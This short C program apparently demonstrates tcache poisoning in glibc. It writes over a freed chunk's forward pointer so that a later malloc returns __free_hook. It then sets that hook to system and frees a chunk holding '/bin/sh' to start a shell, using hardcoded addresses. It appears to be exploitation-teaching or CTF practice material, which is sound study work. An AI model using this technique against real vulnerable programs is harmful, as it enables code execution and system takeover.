#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <string.h>
#define __free_hook 0x7ffff7dd18e8
#define system 0x7ffff7a334e0

void init() {
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stdin, 0, 1, 0);
	setvbuf(stderr, 0, 1, 0);
}

int main(){	
	long size = 0x68;
	long long *p,*q,*r;
	init();
	// init a chunk
	p = malloc(size);
	// place p into tcache bin
	free(p);
	sleep(0);
	// set p's fd to __free_hook
	p[0] = __free_hook;
	sleep(0);
	// malloc twice to get the target chunk
	q = malloc(size);
	r = malloc(size);
	printf("%p\n",r);
	sleep(0);
	// write __free_hook to system
	r[0] = system;
	// write /bin/sh to q
	strcpy(q,"/bin/sh");
	free(q);
	sleep(0);
}

